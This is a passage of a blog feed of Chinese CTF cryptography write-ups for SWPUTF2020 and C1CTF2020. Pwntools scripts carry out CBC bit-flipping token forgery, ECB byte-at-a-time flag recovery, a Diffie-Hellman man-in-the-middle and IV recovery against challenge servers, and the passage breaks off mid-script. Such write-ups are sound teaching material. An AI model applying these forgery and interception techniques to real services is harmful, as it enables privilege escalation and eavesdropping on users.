href="#Yusa的密码学课堂-CBC第一课" class="headerlink" title="Yusa的密码学课堂_CBC第一课"></a>Yusa的密码学课堂_CBC第一课</h2><p>服务器提供了加密和解密，加密时会把<code>iv</code>给我们，并且要使得解密后的明文为<code>yusayusayusayusaadmin</code></p><p>我们记第一块区域<code>yusayusayusayusa</code>记为<code>pre</code>块，第二块为<code>name</code>块，我们需要在保证<code>pre</code>块不变的情况下改变<code>name</code>块，由于是CBC模式，所以<code>payload</code>需要从后往前构造</p><p>首先使用<code>11111</code>进行注册，给<code>pre</code>块异或<code>11111</code>和<code>admin</code>得到<code>new_pre</code>后即可达到将<code>name</code>变为<code>admin</code>的目的，但是这样会使得<code>D(new_pre)</code>块不可控，所以我们重新构造一个<code>new_iv</code>（比如<code>1111111111111111</code>），得到的结果即为<code>D(new_pre)^new_iv</code>，所以我们即可构造<code>fianl_iv</code>为<code>yusayusayusayusa</code>异或<code>D(new_pre)</code>，最终得到<code>payload=final_iv+new_pre+name</code>，将其打回服务器即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">table = digits+ascii_letters</span><br><span class="line">r = remote(<span class="string">&quot;das.wetolink.com&quot;</span>, <span class="string">&quot;42888&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;3. exit&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;11111&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Here is your token(in hex): &#x27;</span>)</span><br><span class="line">iv = long_to_bytes(int(r.recv(<span class="number">32</span>).strip().decode(),<span class="number">16</span>))</span><br><span class="line">pre = long_to_bytes(int(r.recv(<span class="number">32</span>).strip().decode(),<span class="number">16</span>))</span><br><span class="line">name = long_to_bytes(int(r.recv(<span class="number">32</span>).strip().decode(),<span class="number">16</span>))</span><br><span class="line">string1 = <span class="string">b&#x27;admin           &#x27;</span></span><br><span class="line">string2 = <span class="string">b&#x27;11111           &#x27;</span></span><br><span class="line"></span><br><span class="line">new_pre = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    x = pre[i] ^ string1[i] ^ string2[i]</span><br><span class="line">    new_pre += chr(x)</span><br><span class="line">new_pre = new_pre.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_iv = <span class="string">b&#x27;1&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload = new_iv+new_pre+name</span><br><span class="line">payload = hex(bytes_to_long(payload))[<span class="number">2</span>:]</span><br><span class="line">r.recvuntil(<span class="string">&#x27;3. exit&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Your token(in hex): &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv(<span class="number">32</span>)</span><br><span class="line">res = long_to_bytes(int(r.recv(<span class="number">32</span>).strip().decode(),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">qwq = <span class="string">b&#x27;yusa&#x27;</span>*<span class="number">4</span></span><br><span class="line">finalpayload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    x = qwq[i] ^ res[i] ^ new_iv[i]</span><br><span class="line">    finalpayload += chr(x)</span><br><span class="line">finalpayload = finalpayload.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">finalpayload = finalpayload+new_pre+name</span><br><span class="line">finalpayload = hex(bytes_to_long(finalpayload))[<span class="number">2</span>:]</span><br><span class="line">print(finalpayload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;3. exit&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Your token(in hex): &#x27;</span>)</span><br><span class="line">r.sendline(finalpayload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Yusa的密码学课堂-ECB"><a href="#Yusa的密码学课堂-ECB" class="headerlink" title="Yusa的密码学课堂_ECB"></a>Yusa的密码学课堂_ECB</h2><p><code>Key</code>固定，服务器提供输入一个字符串并将flag加在后面加密返回</p><p>我们先提交<code>a</code>、<code>aa</code>、<code>aaa</code>……通过观察返回加密结果的长度可以测得flag的长度（即构建<code>padding</code>）</p><p>因为是ECB，没有<code>iv</code>混淆情况下，如果明文一致，密文一定是一致的，所以我们可以通过将flag一位一位推至下一个加密块，并且构建一个新块来进行爆破，找到一位即可加入已知flag来进行下一次爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">BLOCKSIZE = <span class="number">16</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">        pad_len = BLOCKSIZE - (len(data) % BLOCKSIZE) <span class="keyword">if</span>  len(data) % BLOCKSIZE != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> data + chr(pad_len) * pad_len</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;das.wetolink.com&quot;</span>, <span class="string">&quot;42887&quot;</span>)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">talk</span>(<span class="params">x</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Amazing function: &#x27;</span>)</span><br><span class="line">    r.sendline(x)</span><br><span class="line">    res = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> res.strip().decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = hex(bytes_to_long(x.encode(<span class="string">&#x27;latin1&#x27;</span>)))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> talk(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">x</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;b&#x27;</span> * x</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">flaghash = talk(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">&#x27;00&#x27;</span>*cnt</span><br><span class="line">    tmp = talk(payload)</span><br><span class="line">    <span class="keyword">if</span>(len(tmp) != len(flaghash)):</span><br><span class="line">        cnt -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">flaglen = len(flaghash) // <span class="number">32</span> * <span class="number">16</span> - cnt</span><br><span class="line">need = <span class="string">&#x27;a&#x27;</span>*cnt</span><br><span class="line"></span><br><span class="line">mine = <span class="string">&#x27;&#x27;</span></span><br><span class="line">now = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    tmp = pad(i + mine[:<span class="number">16</span>])</span><br><span class="line">    <span class="keyword">if</span>(len(tmp)!=<span class="number">16</span>):</span><br><span class="line">        tmp += <span class="string">&#x27; &#x27;</span> * (<span class="number">16</span> - len(tmp))</span><br><span class="line">    payload = tmp + need + put(now)</span><br><span class="line">    res = get(payload)</span><br><span class="line">    <span class="keyword">if</span>(res[:<span class="number">32</span>] == res[<span class="number">-32</span>*(<span class="number">1</span>+now//<span class="number">32</span>):<span class="number">-32</span>*(now//<span class="number">32</span>)]):</span><br><span class="line">        mine = i + mine</span><br><span class="line">        print(mine)</span><br><span class="line">        now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{7241502d1f614bf28bbaa4e898e9893e}</p></blockquote><p>AK啦！溜~</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-SWPUTF2020-39-s-Crypto&quot;&gt;&lt;a href=&quot;#Wp-for-SWPUTF2020-39-s-Crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for SWPUTF2020&amp;#39;s Crypto&quot;&gt;&lt;/a&gt;Wp for SWPUTF2020&amp;#39;s Crypto&lt;/h1&gt;&lt;p&gt;很无语，T1刚开始数据给错，T2T3连不上，活活让人等到中午才更新&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Write up for C1CTF&#39;s Crypto</title>
    <link href="http://example.com/2020/12/06/Wp_for_C1CTF2020/"/>
    <id>http://example.com/2020/12/06/Wp_for_C1CTF2020/</id>
    <published>2020-12-06T13:09:47.000Z</published>
    <updated>2021-03-11T01:22:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-C1CTF2020-39-s-Crypto"><a href="#Wp-for-C1CTF2020-39-s-Crypto" class="headerlink" title="Wp for C1CTF2020&#39;s Crypto"></a>Wp for C1CTF2020&#39;s Crypto</h1><p>先放一句话<strong>role=Tsunate;</strong></p><p>题目倒是蛮好玩的</p><a id="more"></a><h2 id="Base的千层套路"><a href="#Base的千层套路" class="headerlink" title="Base的千层套路"></a>Base的千层套路</h2><p>拿到的是一个base编码后的结果，写个脚本一直解码，最后得到flag</p><blockquote><p>c1ctf{Ba5e_3nc0ding_i5_e4sy}</p></blockquote><h2 id="PigIsSoCute"><a href="#PigIsSoCute" class="headerlink" title="PigIsSoCute"></a>PigIsSoCute</h2><p>题目给了一个<code>piggggggg.txt</code>，打开是base64编码的一个图片，在线转换一下得到一个图片</p><p><img src="https://i.loli.net/2020/12/06/sroGtT2x5jzYDwl.png" alt="25.png"></p><p>猪圈密码解一下得到一个字符串，根据题目描述尝试栅栏后得到一个有意义的字符串</p><blockquote><p>c1ctf{pigissocutebutporkissoexp}</p></blockquote><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>刚开始看到 $e=3$ ，而且三个密文都一样，并且比 $n$ 小得多，尝试直接开三次方后无果，<del>其实是出题人自己把数据给错了，给的c根本就不是立方，直接就是flag。</del></p><p>后来更新了附件， $c$ 和 $n$ 大小差不多，但是给了三次加密，拓展欧几里得合并一下就有了</p><h2 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a>MITM</h2><p><del>刚开始出题人把题目名称写错了哈哈哈哈哈</del></p><p>既然是中间人攻击，那么我们就应该在与<code>A</code>交互时伪装成<code>B</code>，在与<code>B</code>交互时伪装成<code>A</code></p><p>过了pow之后给了 $g$ 和 $p$ ，这里一定要把和谁交互分清楚，<del>因为出题人名字起的太像了，所以刚开始把自己给绕进去了</del>，我们把与<code>Hiro</code>交互的数据统一加上<code>Hiro</code>前缀，把与<code>Zero</code>交互的数据统一加上<code>Zero</code>前缀，根据题目在<code>[2,p-1)</code>随便选个数计算 $Hiro_A =g^{Hiro_a}\ mod\ q$ ，并且得到 $Zero_A$ ，然后再与<code>Hiro</code>进行一次秘钥交换，得到 $Hiro_B$ 和 $ZeroB$ ，这样我们就可以得到与两个人分别的<code>Key</code>，因为 $Hiro_{Key}= {Hiro_B}^{Hiro_a} = {Hiro_A}^{Hiro_b}$ ，所以再两人交换 $m$ 时就可以进行自如的加密解密，最后得到的两个 $m$ 拼起来就是<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = digits+ascii_letters</span><br><span class="line">r = remote(<span class="string">&quot;8.136.142.239&quot;</span>, <span class="string">&quot;30400&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span>():</span></span><br><span class="line">rev = r.recvuntil(<span class="string">&quot;sha256(XXXX+&quot;</span>)</span><br><span class="line">suffix = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot; == &quot;</span>)</span><br><span class="line">res = r.recv(<span class="number">64</span>).decode()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">hashresult = hashlib.sha256((x+suffix).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hashresult == res:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me XXXX:&quot;</span>)</span><br><span class="line">r.sendline(str(prefix))</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line">print(<span class="string">&#x27;Successfully pass the pow!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;[Hiro]: g = &quot;</span>)</span><br><span class="line">g = int(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line">r.recvuntil(<span class="string">&quot;[Hiro]: p = &quot;</span>)</span><br><span class="line">p = int(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">Hiro_a = <span class="number">3</span></span><br><span class="line">Hiro_A = pow(g,Hiro_a,p)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[Aside]: You intercepted Zero&#x27;s message, which is `A = &quot;</span>)</span><br><span class="line">Zero_A = int(r.recvuntil(<span class="string">&quot;`&quot;</span>)[:<span class="number">-1</span>].strip().decode())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">r.sendline(str(Hiro_A))</span><br><span class="line"></span><br><span class="line">Zero_b = <span class="number">3</span></span><br><span class="line">Zero_B = pow(g,Zero_b,p)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[Aside]: You intercepted Hiro&#x27;s message, which is `B = &quot;</span>)</span><br><span class="line">Hiro_B = int(r.recvuntil(<span class="string">&quot;`&quot;</span>)[:<span class="number">-1</span>].strip().decode())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">r.sendline(str(Zero_B))</span><br><span class="line"></span><br><span class="line">Hiro_Key = pow(Hiro_B,Hiro_a,p)</span><br><span class="line">Zero_Key = pow(Zero_A,Zero_b,p)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;[Aside]: You intercepted Hiro&#x27;s message, which is `C_b = &quot;</span>)</span><br><span class="line">Hiro_got = int(r.recvuntil(<span class="string">&quot;`&quot;</span>)[:<span class="number">-1</span>].strip().decode())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">m = (Hiro_got * inverse(Hiro_Key,p)) % p</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">Zero_give = (m * Zero_Key) % p</span><br><span class="line">r.sendline(str(Zero_give))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;[Aside]: You intercepted Zero&#x27;s message, which is `C_a = &quot;</span>)</span><br><span class="line">Zero_got = int(r.recvuntil(<span class="string">&quot;`&quot;</span>)[:<span class="number">-1</span>].strip().decode())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">m = (Zero_got * inverse(Zero_Key,p)) % p</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">Hiro_give = (m * Hiro_Key) % p</span><br><span class="line">r.sendline(str(Hiro_give))</span><br></pre></td></tr></table></figure><blockquote><p>c1ctf{Dif7ie_he1lman_is_n0t_p3rfect}</p></blockquote><h2 id="aesstudy1"><a href="#aesstudy1" class="headerlink" title="aesstudy1"></a>aesstudy1</h2><p>写题解之前说点有的没的，因为出题人太爱讲故事，所以…</p><p><img src="https://i.loli.net/2020/12/06/LVnxE4GJjwizqaP.png" alt="26.png"></p><p>题目就是套娃AES，给一步做一步就好了，</p><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>给了<code>key</code>，给了<code>msg</code>，要我们返回加密后的结果</p><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>看来半天不知道要我干啥，也不知道要我返回啥，自己一个人傻看了一个小时才去问了出题人</p><p><del>我怎么知道要把Tsunate换成Kakashi啊</del></p><p>因为AES是16个字节一块块加密的，而且是ECB模式，因为出题人的精心构造，正好4块并且结构很整齐，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Tsunate can see </span><br><span class="line">AAA Message and </span><br><span class="line">Kakashi can see </span><br><span class="line">BBB Message.....</span><br></pre></td></tr></table></figure><p>所以，只需要把第三块的密文覆盖到第一块再打回去就行了</p><p><del>另外，我怎么知道要把前面那句话一起打回去啊</del></p><p>step2过了之后就能拿到第一个flag了</p><h3 id="setp3"><a href="#setp3" class="headerlink" title="setp3"></a>setp3</h3><p>要登录，并且一共有两块，第一块会作为<code>iv</code>和解密后的第二块异或，而题目告诉了我们明文第二块是<code>MN;role=Konoha;</code>，给第一块异或<code>\x00\x00\x00\x00\x00\x00\x00\x00Kakashi;</code>和<code>\x00\x00\x00\x00\x00\x00\x00\x00Tsunate;</code>就可以使得明文变成<code>role=Tsunate;</code></p><p><del>我怎么知道要换成Tsunate啊，不是Konoka的登录系统吗</del></p><h3 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h3><p>服务器提供一次AES的解密，让我们猜<code>iv</code>，我们给服务器发送32位<code>\x00</code>，得到两块结果，根据AES.CBC的解密，可以知道第一块是<code>D(input1)^iv</code>，第二块是<code>D(input2)^input1</code>，因为我们构造的<code>input1</code>和<code>input2</code>都是16位<code>\x00</code>，所以这两块异或所得就是<code>iv</code>，再发回服务器就行了</p><p>step4过掉，第二个flag就拿到了</p><h3 id="finalexp-py"><a href="#finalexp-py" class="headerlink" title="finalexp.py"></a>finalexp.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">table = digits+ascii_letters</span><br><span class="line">r = remote(<span class="string">&quot;8.136.131.7&quot;</span>, <span class="string">&quot;30339&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;The key in hex is &quot;</span>)</span><br><span class="line">key1 = long_to_bytes(int(r.recvuntil(<span class="string">&#x27;,&#x27;</span>)[:<span class="number">-1</span>].strip().decode(),<span class="number">16</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;the msg in hex is &quot;</span>)</span><br><span class="line">msg1 = long_to_bytes(int(r.recvuntil(<span class="string">&#x27;,&#x27;</span>)[:<span class="number">-1</span>].strip().decode(),<span class="number">16</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;the AES-ECB-128 encryption:&quot;</span>)</span><br><span class="line"></span><br><span class="line">aes1 = AES.new(key1,AES.MODE_ECB)</span><br><span class="line">cipher1 = aes1.encrypt(msg1)</span><br><span class="line">cipher1 = hex(bytes_to_long(cipher1))[<span class="number">2</span>:]</span><br><span class="line">r.sendline(cipher1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;.....|&quot;</span>)</span><br><span class="line">cipher2 = r.recvline(<span class="literal">False</span>)</span><br><span class="line">cipherlist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">cipherlist.append(cipher2[i*<span class="number">32</span>:(i+<span class="number">1</span>)*<span class="number">32</span>])</span><br><span class="line">payload2 = <span class="string">b&#x27;Kakashi can see AAA Message and Kakashi can see BBB Message.....|&#x27;</span>+cipherlist[<span class="number">2</span>]+cipherlist[<span class="number">1</span>]+cipherlist[<span class="number">2</span>]+cipherlist[<span class="number">3</span>]</span><br><span class="line">r.recvuntil(<span class="string">&quot;Input the message after you modified:&quot;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;And you interrupt the ciphertext &quot;</span>)</span><br><span class="line"><span class="comment"># m = b&#x27;SSID=AVsasbSJtpTMN;role=Konoha;&#x27;</span></span><br><span class="line">iv = long_to_bytes(int(r.recv(<span class="number">32</span>).strip().decode(),<span class="number">16</span>))</span><br><span class="line">cipher3 = r.recv(<span class="number">32</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">aaa = <span class="string">b&#x27;        Kakashi;&#x27;</span></span><br><span class="line">bbb = <span class="string">b&#x27;        Tsunate;&#x27;</span></span><br><span class="line">payload3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(aaa)):</span><br><span class="line">tmp = aaa[i] ^ bbb[i] ^ iv[i]</span><br><span class="line">payload3 += chr(tmp)</span><br><span class="line">payload3 = payload3.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">payload3 = hex(bytes_to_long(payload3))[<span class="number">2</span>:]</span><br><span class="line">payload3 = payload3+str(cipher3)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">r.sendline(payload3)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Input something:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;your input (in hex): &#x27;</span>)</span><br><span class="line">iiv = r.recvline(<span class="literal">False</span>)</span><br><span class="line">print(iiv)</span><br><span class="line">iiv1 = long_to_bytes(int(iiv[<span class="number">0</span>:<span class="number">32</span>].strip().decode(),<span class="number">16</span>))</span><br><span class="line">iiv2 = long_to_bytes(int(iiv[<span class="number">32</span>:<span class="number">64</span>].strip().decode(),<span class="number">16</span>))</span><br><span class="line">print(iiv1)</span><br><span class="line">print(iiv2)</span><br><span class="line">payload4 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(iiv1)):</span><br><span class="line">tmp = iiv1[i] ^ iiv2[i]</span><br><span class="line">payload4 += chr(tmp)</span><br><span class="line">payload4 = payload4.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">payload4 = hex(bytes_to_long(payload4))[<span class="number">2</span>:]</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Tell me the iv in 